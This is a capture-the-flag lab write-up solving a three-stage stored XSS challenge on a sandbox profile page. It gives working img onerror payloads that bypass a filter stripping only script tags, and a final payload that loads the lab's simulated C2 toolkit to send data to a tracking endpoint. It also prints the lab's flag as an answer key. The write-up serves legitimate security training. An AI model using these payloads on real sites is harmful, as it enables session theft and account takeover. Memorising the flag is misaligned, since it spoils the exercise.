# Task 3. Stored XSS - User Profile

## **Task 3 Description**


### 3. Stored XSS - User Profile

The profile page has a twist: it loads data from a JSON API, then renders it client-side. The API response looks clean. The bug is not in the server's JSON it is in how the browser renders it.

If the frontend uses `innerHTML` to insert profile data, any HTML stored in those fields becomes executable when the page loads.

#### Stage URLs

| Stage | URL | What Changes |
| :--- | :--- | :--- |
| 1 | `/profile` | Bio field rendered unsafely |
| 2 | `/profile/settings` | Script tags filtered |
| 3 | `/profile/edit` | Hidden: another profile field is vulnerable |

#### Mission Objectives
1. Open Network tab and find the API call that returns your profile data.
2. Open Sources or Elements and find where the API response is inserted into the DOM.
3. Look for `innerHTML` that is your sink.
4. Inject into the bio field, save, and reload. Watch the API response.
5. For Stage 3, inspect all profile fields, not just bio.

#### Hints
* JSON transport is safe. `innerHTML` rendering is not.
* `textContent` is safe `innerHTML` is the danger.
* Different profile fields may be rendered differently by the frontend code.
* Once your payload is stored, async rendering makes the delayed token pattern very reliable.

#### Deeper Concept
```text
API returns:      { "bio": "<img src=x onerror=alert(1)>" }
Frontend renders: profileDiv.innerHTML = data.bio
Browser executes: onerror fires → alert(1)
```
The JSON is safe in transit. The frontend made it dangerous.

#### Verification Checklist
- [ ] Network shows the API response carrying your payload
- [ ] Elements shows your payload inserted via `innerHTML`
- [ ] C2 shows form submission or storage exfiltration evidence
- [ ] Stage 3 returns the flag

#### Repo:
* **GitHub repository:** `dlh-cyber_security`
* **Directory:** `web_application_security/websec_0x0C`
* **File:** `4-flag.txt`



## **Solution**



- Start sandbox `cyber_websec_0x0c`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.46.79 web0x0c.hbtn" | sudo tee -a /etc/hosts
```


## Step 1: Identify the profile JSON API

Action: Inspect the network traffic generated when loading the Stage 1 profile page.

1. Open Firefox on Kali and navigate to:

   `http://web0x0c.hbtn/profile`
2. Press `F12` and select Network.
3. Select the XHR filter (or Fetch/XHR).
4. Reload the page with `Ctrl+R`.
5. Find the request that returns profile data and open its Response tab.

```json
{
	 "bio":"",
	 "location":"",
	 "username":"Guest",
	 "website":""
}
```

The API endpoint that returns the profile data is:

```
http://web0x0c.hbtn/profile/api/data
```



## Step 3: Locate the DOM rendering code

On `http://web0x0c.hbtn/profile`:

1. Open Firefox DevTools (`F12`).
2. Select Debugger (Firefox's equivalent of Chrome's Sources tab).
3. Press `Ctrl+Shift+F` to search across loaded source files.
4. Search for:
   ```
   innerHTML
   ```
5. Look for code associated with `/profile/api/data`, particularly assignments resembling:
   ```
   element.innerHTML = data.bio;
   ```

The JavaScript containing `innerHTML`, responsible for loading and saving the profile data:

```javascript
<script>
// Load profile data from API and render with innerHTML (VULNERABLE)
async function loadProfile() {
    try {
        const res = await fetch('/profile/api/data');
        const data = await res.json();

        // VULNERABLE: innerHTML with unsanitized data
        document.getElementById('profile-username').innerHTML = data.username || 'Guest';
        document.getElementById('profile-bio').innerHTML = data.bio || 'No bio set';
        document.getElementById('profile-location').innerHTML = data.location ? '📍 ' + data.location : '';
        document.getElementById('profile-website').innerHTML = data.website ? '🔗 ' + data.website : '';
    } catch (e) {
        document.getElementById('profile-username').textContent = 'Guest';
        document.getElementById('profile-bio').textContent = '';
    }
}

async function saveProfile() {
    const data = {
        username: document.getElementById('edit-username').value,
        bio: document.getElementById('edit-bio').value,
        location: document.getElementById('edit-location').value,
        website: document.getElementById('edit-website').value
    };

    await fetch('/profile/api/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });

    loadProfile();
}

loadProfile();
</script>
```


We now have the complete source-to-sink chain:

- Source: `GET /profile/api/data`
- Storage endpoint: `POST /profile/api/update`
- Vulnerable sink: `document.getElementById('profile-bio').innerHTML = data.bio`
- Important discovery: All four profile fields use `innerHTML`, making each a potential XSS injection point.

Because the frontend uses `innerHTML`, injected `<script>` elements generally won't execute, but HTML event handlers can.

## Step 4: Prove stored XSS execution in Stage 1

On `http://web0x0c.hbtn/profile`, enter this payload into the Bio field (make sure there is no trailing newline):

```
<img src=x onerror="console.log('PROFILE_XSS_STAGE1_EXECUTED')">
```

Click Save Profile, then reload the page with the Firefox Console open.

Console result:

```
PROFILE_XSS_STAGE1_EXECUTED
```

The image fails to load, triggering `onerror` and executing JavaScript. Since the message appears after reloading, we've confirmed persistent stored XSS rather than a one-time DOM injection.

On dev-tools \ storage \ cookies we can see the session cookie:

```
session:"eyJmbGFncyI6W10sImxldmVsXzVfc3RhZ2UiOjEsInNlc3Npb25faWQiOiIxcjZPVGRycHYxZm5oaWM2ZzBiS29GV1BvRXBXMXkyT0ctWktla2dqSzFvIn0.auWuQw.zzuJ5AqAo-Lup4NsqEj19D17isk"
```
The Anatomy of the Cookie:\
It consists of three parts separated by periods (.): \
```
session = [Payload] . [Timestamp] . [Signature]
```

Decoding the cookie payload with base64:

```bash
echo "eyJmbGFncyI6W10sImxldmVsXzVfc3RhZ2UiOjEsInNlc3Npb25faWQiOiIxcjZPVGRycHYxZm5oaWM2ZzBiS29GV1BvRXBXMXkyT0ctWktla2dqSzFvIn0" | base64 -d
{"flags":[],"level_5_stage":1,"session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o"}
```

This reveals that we're on Level 5 Stage 1.


## Step 5: Identify the profile tracking endpoint

From Task 2, we learned that the C2 toolkit's `XSS.pwn()` function requires the correct level, stage, and tracking endpoint.

For Task 3, `/profile/api/track` is a plausible candidate, but we need to verify it.


```bash
curl http://web0x0c.hbtn/profile/api/track?t=test
{"status":"error"}
```

The response `{"status":"error"}` shows that `/profile/api/track` exists and processes the request, although we haven't established the correct token yet.

## Step 6: Inspect Stage 2, Profile Settings

Objective: Determine whether our existing Stage 1 stored XSS payload also executes on Stage 2.

Action:

1. Navigate to:
```
http://web0x0c.hbtn/profile/settings
```
2. Open Firefox DevTools → Console.
3. Clear the Console and reload the page.

Look for our previously stored execution marker:

```
PROFILE_XSS_STAGE1_EXECUTED
```

The observations:

- The `PROFILE_XSS_STAGE1_EXECUTED` doesn't appear in the Console.
- The Bio field is empty, "No bio set" is displayed under Guest.

Stage 2 isn't displaying our Stage 1 payload at all.

This suggests stage-specific profile storage or filtering, but we can't distinguish between them yet. Let's establish whether Stage 2 accepts and renders HTML independently.

## Step 7: Test HTML injection on Stage 2

Stay on:

`http://web0x0c.hbtn/profile/settings`

Enter the following into the Bio field (make sure there is no trailing newline):

```
<b id="stage2-probe">STAGE2_HTML_OK</b>
```

Click Save Profile, then reload the page.

Observations:

1. The `STAGE2_HTML_OK` appears in bold, there are no literal HTML tags. \
`/profile/api/data` returns:

```json
{
    "bio":"<b id=\"stage2-probe\">STAGE2_HTML_OK</b>",
    "id":4,
    "location":"",
    "session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o",
    "stage":2,
    "username":"userSettings",
    "website":""
}
```
2. The value persist after reloading.



We also learned that the API exposes `"stage":2` and `"id":4`, supporting the hypothesis that profiles are stored separately by stage.

## Step 8: Test Stage 2 script filtering and XSS execution

Objective: Determine whether Stage 2 strips `<script>` elements while allowing JavaScript event handlers.

Stay on:

`http://web0x0c.hbtn/profile/settings`

Replace the Bio field with (make sure there is no trailing newline):

```
<script>console.log('STAGE2_SCRIPT')</script><img src=x onerror="console.log('STAGE2_XSS_EXECUTED')">
```

Click Save Profile, then reload with DevTools → Console open.

Inspect the `/profile/api/data` response as well.

Observations:

1. The exact value of `bio` in the API JSON response. \
```json
{
    "bio":"<img src=x onerror=\"console.log('STAGE2_XSS_EXECUTED')\">",
    "id":5,
    "location":"",
    "session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o",
    "stage":2,
    "username":"userSettings","website":""
}
```
2. `STAGE2_XSS_EXECUTED` appears in the Console.


We have established that:

- The server removes `<script>` elements from the saved bio.
- The `<img onerror>` payload survives unchanged.
- JavaScript executes automatically when the stored profile is rendered.
- The payload persists after reloading.

This demonstrates why filtering `<script>` tags alone is insufficient to prevent XSS.

## Step 9: Investigate Stage 3, Profile Edit

Objective: Identify the profile fields available in Stage 3 before testing the hidden vulnerable field.

Navigate to:

```
http://web0x0c.hbtn/profile/edit
```

Open Firefox DevTools → Network, reload the page, and inspect the response from:

`GET /profile/api/data`

The complete JSON response:

```json
{
    "bio":"",
    "location":"",
    "username":"Guest",
    "website":""
}
```

The Stage 3 hint suggests that the vulnerability is in a field other than `bio`. Rather than guessing, we'll inspect the returned data and then test the fields systematically.

Stage 3 currently returns the default profile: `Guest`, with empty `bio`, `location`, and `website` fields.

Unlike Stage 2, the response has no `id` or `stage` metadata. That is consistent with a profile that hasn't yet been saved for this stage, although it doesn't prove that storage is separate.

## Step 10: Test Bio and Username Fields for HTML injection

Objective: Determine whether Stage 3's `username` field accepts and renders HTML.

On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:

```
<b id="stage3-username-probe">STAGE3_USERNAME_HTML</b>
```

and the Bio field with:

```<b id="stage3-bio-probe">STAGE3_BIO_HTML</b>
```
(make sure there are no trailing newlines).

Click Save Profile and reload the page.

Observations:

1. The `STAGE3_USERNAME_HTML` appears in bold
2. The `STAGE3_BIO_HTML` displays html encoded HTML tags.
3. The `GET /profile/api/data` returns:

```json
{
    "bio":"&amp;lt;b id=&amp;quot;stage3-username-probe&amp;quot;&amp;gt;STAGE3_BIO_HTML&amp;lt;/b&amp;gt;",
    "id":7,
    "location":"",
    "session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o",
    "stage":3,
    "username":"<b id=\"stage3-username-probe\">STAGE3_USERNAME_HTML</b>","website":""
}
```

We've identified the Stage 3 vulnerability: the Username field is rendered as HTML, while the Bio field is encoded.

| Field      | API behavior                 | Browser behavior       |
| ---------- | ---------------------------- | ---------------------- |
| `username` | Raw HTML preserved           | `<b>` renders in bold  |
| `bio`      | HTML entities double-encoded | Tags displayed as text |

This is exactly the Stage 3 twist described in the challenge. The frontend may use `innerHTML` for both fields, but the server applies different encoding rules.

## Step 11: Confirm stored XSS in the Username field

Objective: Verify that JavaScript executes from the stored `username` value after reloading Stage 3.

On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:

```
<img src=x onerror="console.log('PROFILE_XSS_STAGE3_EXECUTED')">
```

Click Save Profile, then reload with Firefox DevTools → Console open.

Console output: ✅

```
PROFILE_XSS_STAGE3_EXECUTED
```

Stage 3 stored XSS is confirmed. The Username field executes JavaScript after a page reload.

We now have everything needed for the flag attempt:

- Level: `5`
- Stage: `3`
- Vulnerable field: `username`
- Tracking endpoint: `/profile/api/track`
- C2 toolkit: `/attacker/toolkit.js`

## Step 12: Attempt Stage 3 flag capture

We'll reuse the `XSS.pwn()` technique that successfully captured the Task 2 flag.

On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:

```
<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
```

Click Save Profile, then reload the page.

Open Firefox DevTools → Network, filter for `track`, and inspect the response from:

`/profile/api/track`

The payload calls `XSS.pwn(5,3,...)`, which should invoke the lab's C2 and flag-capture flow using the correct level, stage, and callback endpoint.

The HTTP response from `/profile/api/track`:
```json
{
    "ref":"FLAG{dde3e144519a50db0432f0422cf8d85e}",
    "status":"tracked"
}
```

**Verify the flag:** ✅

```bash
echo dde3e144519a50db0432f0422cf8d85e > 4-flag.txt
git add .
git commit -m "4-flag.txt"
git push
```

